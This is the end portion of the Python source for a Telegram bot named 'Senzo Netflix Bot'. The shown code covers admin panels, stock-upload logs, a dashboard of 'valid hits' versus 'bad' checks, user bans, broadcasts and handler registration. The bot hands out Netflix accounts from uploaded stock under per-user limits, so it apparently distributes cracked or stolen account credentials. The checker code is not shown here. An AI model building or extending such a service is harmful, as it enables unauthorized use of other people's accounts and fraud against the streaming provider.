        await send_or_edit(
            update,
            "➕ <b>ADD REQUIRED CHANNEL</b>\n\n"
            "Please send channel details in this exact format:\n"
            "<code>CHANNEL_ID | CHANNEL_NAME | INVITE_LINK</code>\n\n"
            "Example:\n"
            "<code>@MyChannel | My Updates Channel | https://t.me/MyChannel</code>\n\n"
            "👨‍💻 <b>Developer:</b> @Senzo268",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        logger.error(f"Error in add_channel_prompt: {e}")

async def del_channel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        cid = int(query.data.split("_")[2])
        db.execute('DELETE FROM channels WHERE id = ?', (cid,))
        db.commit()
        await query.answer("✅ Channel removed!")
        await admin_channels(update, context)
    except Exception as e:
        logger.error(f"Error in del_channel_callback: {e}")

async def admin_stock_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return
            
        logs = get_stock_logs_history()
        text = "📊 <b>RECENT STOCK UPLOAD LOGS</b>\n\n"
        if not logs:
            text += "<i>No stock logs recorded yet.</i>\n"
        else:
            for l in logs:
                text += f"▫️ <b>{h(l['file_name'])}</b>\n   └ Found: {l['total']} | Valid Saved: {l['valid']} | Admin: {l['admin_id']} | Date: {h(l['time'])}\n"
                
        text += "\n👨‍💻 <b>Developer:</b> @Senzo268"
        keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")]]
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in admin_stock_logs: {e}")

async def admin_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await send_or_edit(update, "⛔ Not authorized!")
            return
            
        stats = get_total_accounts()
        users = get_all_users()
        banned = get_banned_users()
        
        cur = db.execute('SELECT total_hits, total_free, total_bad FROM stats WHERE date = CURRENT_DATE')
        row = cur.fetchone()
        today_hits = row[0] if row else 0
        today_free = row[1] if row else 0
        today_bad = row[2] if row else 0
        
        text = f"""📈 <b>SYSTEM & METRICS DASHBOARD</b>
━━━━━━━━━━━━━━━━━━━━━
📊 <b>STOCK BREAKDOWN</b>
┌─────────────────────
│ 📦 Total Available Stock: <b>{safe_int(stats.get('total'))}</b>
"""
        for plan, count in stats.get('plans', {}).items():
            text += f"│ ▫️ {h(plan)}: <b>{count}</b>\n"
            
        text += f"""└─────────────────────
👥 <b>USER BASE METRICS</b>
┌─────────────────────
│ 👤 Total Users: <b>{len(users)}</b>
│ 🚫 Banned Users: <b>{len(banned)}</b>
└─────────────────────
⚡ <b>TODAY'S ACTIVITY</b>
┌─────────────────────
│ ✅ Valid Hits Checked: <b>{today_hits}</b>
│ 🆓 Free/Expired Checked: <b>{today_free}</b>
│ ❌ Bad/Invalid Checked: <b>{today_bad}</b>
└─────────────────────
⚙️ <b>SYSTEM CONFIG</b>
┌─────────────────────
│ Database Engine: <b>{'Turso DB (Cloud)' if db.use_turso else 'SQLite (Local)'}</b>
│ Max Check Threads: <b>{MAX_CHECK_THREADS}</b>
│ Cooldown: <b>{WORKING_COOLDOWN_MINUTES} min</b>
│ Max Accounts/User: <b>{MAX_ACCOUNTS_PER_USER}</b>
└─────────────────────
👨‍💻 <b>Developer:</b> @Senzo268
"""
        keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")]]
        await send_or_edit(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        logger.error(f"Error in admin_dashboard: {e}")

# ============================================================
# MESSAGE HANDLERS (TEXT & BROADCAST & USER SEARCH)
# ============================================================

async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        msg_text = update.message.text or ""
        
        # 1. Contact Admin Message
        if context.user_data.get("waiting_for_message"):
            context.user_data["waiting_for_message"] = False
            for aid in ADMIN_IDS:
                try:
                    await context.bot.send_message(
                        aid,
                        f"📩 <b>NEW MESSAGE FROM USER</b>\n\n"
                        f"From: @{h(update.effective_user.username)} (ID: <code>{user_id}</code>)\n\n"
                        f"Message:\n<i>{h(msg_text)}</i>\n\n"
                        f"<i>Reply using: /reply {user_id} your message</i>",
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass
            await update.message.reply_text("✅ <b>Your message has been sent to the admins!</b>", parse_mode=ParseMode.HTML)
            return

        # 2. Admin Broadcast (Text)
        if user_id in ADMIN_IDS and context.user_data.get("waiting_for_broadcast"):
            context.user_data["waiting_for_broadcast"] = False
            users = get_all_users()
            active_users = [u for u in users if not u['is_banned']]
            total_u = len(active_users)
            
            status_msg = await update.message.reply_text(f"🚀 Broadcasting message to <b>{total_u}</b> users...", parse_mode=ParseMode.HTML)
            
            success, failed = 0, 0
            for u in active_users:
                try:
                    await context.bot.send_message(u['user_id'], msg_text, parse_mode=ParseMode.HTML)
                    success += 1
                except Exception:
                    failed += 1
                await asyncio.sleep(0.05)
                
            await status_msg.edit_text(
                f"✅ <b>BROADCAST COMPLETE!</b>\n\n"
                f"🎯 Total Users: <b>{total_u}</b>\n"
                f"✅ Delivered: <b>{success}</b>\n"
                f"❌ Failed/Blocked: <b>{failed}</b>",
                parse_mode=ParseMode.HTML
            )
            return

        # 3. Admin User Search
        if user_id in ADMIN_IDS and context.user_data.get("waiting_for_user_search"):
            context.user_data["waiting_for_user_search"] = False
            user = find_user_by_query(msg_text)
            if not user or not user.get('user_id'):
                await update.message.reply_text(f"❌ User <b>{h(msg_text)}</b> not found in database.", parse_mode=ParseMode.HTML)
                return
                
            target_uid = user['user_id']
            text = f"""👤 <b>USER SEARCH RESULT: {h(user.get('first_name'))}</b>
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>User ID:</b> <code>{target_uid}</code>
Username: @{h(user.get('username'))}
📅 Joined: {h(user.get('joined_at'))}
🚫 Banned: {'YES' if user.get('is_banned') else 'NO'}
⚠️ Warnings: {user.get('warnings')}/3
📦 Accounts Used: {user.get('accounts_used')}/{MAX_ACCOUNTS_PER_USER}
✅ Working Reports: {user.get('working_reports')}
❌ Not Working Reports: {user.get('notworking_reports')}
━━━━━━━━━━━━━━━━━━━━━
"""
            keyboard = []
            if user.get('is_banned'):
                keyboard.append([InlineKeyboardButton("🔓 Unban User", callback_data=f"unban_user_{target_uid}")])
            else:
                keyboard.append([InlineKeyboardButton("🚫 Ban User", callback_data=f"admin_ban_{target_uid}")])
                keyboard.append([InlineKeyboardButton("⚠️ Warn User (+1)", callback_data=f"admin_warn_{target_uid}")])
                
            keyboard.append([InlineKeyboardButton("🔄 Reset Limits / Cooldown", callback_data=f"reset_user_{target_uid}")])
            keyboard.append([InlineKeyboardButton("🔙 Back to Users", callback_data="admin_users")])
            
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
            return

        # 4. Admin Add Channel
        if user_id in ADMIN_IDS and context.user_data.get("waiting_for_channel"):
            context.user_data["waiting_for_channel"] = False
            parts = [p.strip() for p in msg_text.split("|")]
            if len(parts) == 3:
                ch_id, ch_name, ch_link = parts[0], parts[1], parts[2]
                try:
                    db.execute('INSERT OR REPLACE INTO channels (channel_id, channel_name, invite_link) VALUES (?, ?, ?)', (ch_id, ch_name, ch_link))
                    db.commit()
                    await update.message.reply_text("✅ Required channel added successfully!", parse_mode=ParseMode.HTML)
                except Exception as e:
                    await update.message.reply_text(f"❌ Database error: {e}")
            else:
                await update.message.reply_text("❌ Invalid format! Please use: <code>CHANNEL_ID | NAME | LINK</code>", parse_mode=ParseMode.HTML)
            return

        await start(update, context)
    except Exception as e:
        logger.error(f"Error in handle_text_messages: {e}")

async def handle_admin_reply_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
            
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("Usage: <code>/reply &lt;user_id&gt; &lt;message&gt;</code>", parse_mode=ParseMode.HTML)
            return
            
        target_uid = int(args[0])
        reply_msg = " ".join(args[1:])
        
        try:
            await context.bot.send_message(
                target_uid,
                f"💬 <b>REPLY FROM ADMIN</b>\n\n"
                f"<i>{h(reply_msg)}</i>\n\n"
                f"👨‍💻 <b>Developer:</b> @Senzo268",
                parse_mode=ParseMode.HTML
            )
            await update.message.reply_text("✅ Reply sent to user successfully!", parse_mode=ParseMode.HTML)
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to send reply: {e}")
    except Exception as e:
        logger.error(f"Error in handle_admin_reply_command: {e}")

# ============================================================
# MAIN APPLICATION ENTRY POINT
# ============================================================

def main():
    print("=" * 70)
    print("🎬 SENZO NETFLIX BOT - ULTIMATE FULLY WORKING EDITION")
    print("=" * 70)
    print(f"📊 Database Engine: {'Turso (PERSISTENT CLOUD)' if db.use_turso else 'SQLite (LOCAL)'}")
    print(f"👤 Admin IDs: {ADMIN_IDS}")
    print(f"📢 Report Channel: {REPORT_CHANNEL_ID if REPORT_CHANNEL_ID else 'NOT SET'}")
    print(f"⏳ Cooldown Minutes: {WORKING_COOLDOWN_MINUTES}")
    print("=" * 70)
    
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ BOT_TOKEN is not configured in environment or .env file!")
        print("👉 Please edit .env file and set BOT_TOKEN.")
        return
    
    # Start Railway HTTP Health Check Server in background daemon thread
    try:
        health_thread = threading.Thread(target=start_health_server, daemon=True)
        health_thread.start()
    except Exception as e:
        logger.error(f"Failed to start health thread: {e}")

    application = Application.builder().token(BOT_TOKEN).build()
    
    # User Command Handlers (Direct Slash Commands)
    application.add_handler(CommandHandler(["start", "help"], start))
    application.add_handler(CommandHandler(["get", "gen", "account"], get_account))
    application.add_handler(CommandHandler(["status", "mystatus"], my_status))
    application.add_handler(CommandHandler(["stats"], stats_command))
    application.add_handler(CommandHandler(["contact"], contact_admin))
    application.add_handler(CommandHandler(["admin"], admin_panel))
    application.add_handler(CommandHandler("reply", handle_admin_reply_command))
    application.add_handler(CommandHandler("user", user_command_lookup))
    
    # User Callback Handlers
    application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
    application.add_handler(CallbackQueryHandler(working_callback, pattern="^(working|report_working_)"))
    application.add_handler(CallbackQueryHandler(notworking_callback, pattern="^(notworking|report_notworking_)"))
    application.add_handler(CallbackQueryHandler(contact_admin, pattern="^contact$"))
    application.add_handler(CallbackQueryHandler(my_status, pattern="^my_status$"))
    application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_menu$"))
    
    # Admin Callback Handlers
    application.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(admin_stock_mgr, pattern="^(admin_stock_mgr|sm_filter_)"))
    application.add_handler(CallbackQueryHandler(delete_account_callback, pattern="^(del_acc_|clear_stock_)"))
    application.add_handler(CallbackQueryHandler(admin_user_search_prompt, pattern="^admin_user_search$"))
    application.add_handler(CallbackQueryHandler(admin_banned, pattern="^admin_banned$"))
    application.add_handler(CallbackQueryHandler(admin_upload, pattern="^admin_upload$"))
    application.add_handler(CallbackQueryHandler(admin_reports, pattern="^admin_reports$"))
    application.add_handler(CallbackQueryHandler(view_report_detail, pattern="^view_rep_"))
    application.add_handler(CallbackQueryHandler(admin_users, pattern="^admin_users$"))
    application.add_handler(CallbackQueryHandler(manage_user_detail, pattern="^manage_user_"))
    application.add_handler(CallbackQueryHandler(admin_user_actions_callback, pattern="^(admin_ban_|admin_warn_|reset_user_)"))
    application.add_handler(CallbackQueryHandler(unban_user_callback, pattern="^unban_user_"))
    application.add_handler(CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$"))
    application.add_handler(CallbackQueryHandler(admin_channels, pattern="^admin_channels$"))
    application.add_handler(CallbackQueryHandler(add_channel_prompt, pattern="^add_channel_prompt$"))
    application.add_handler(CallbackQueryHandler(del_channel_callback, pattern="^del_channel_"))
    application.add_handler(CallbackQueryHandler(admin_stock_logs, pattern="^admin_stock_logs$"))
    application.add_handler(CallbackQueryHandler(admin_dashboard, pattern="^admin_dashboard$"))
    
    # Channel Action Callbacks
    application.add_handler(CallbackQueryHandler(confirm_working_callback, pattern="^confirm_working_"))
    application.add_handler(CallbackQueryHandler(ban_user_callback, pattern="^ban_user_"))
    application.add_handler(CallbackQueryHandler(warn_user_callback, pattern="^warn_user_"))
    application.add_handler(CallbackQueryHandler(dismiss_report_callback, pattern="^dismiss_report_"))
    
    # Message Handlers
    application.add_handler(MessageHandler(filters.PHOTO, handle_screenshot))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_text_messages))
    
    try:
        print("🚀 Bot starting polling...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        print(f"❌ Error starting bot polling: {e}")

if __name__ == "__main__":
    main()
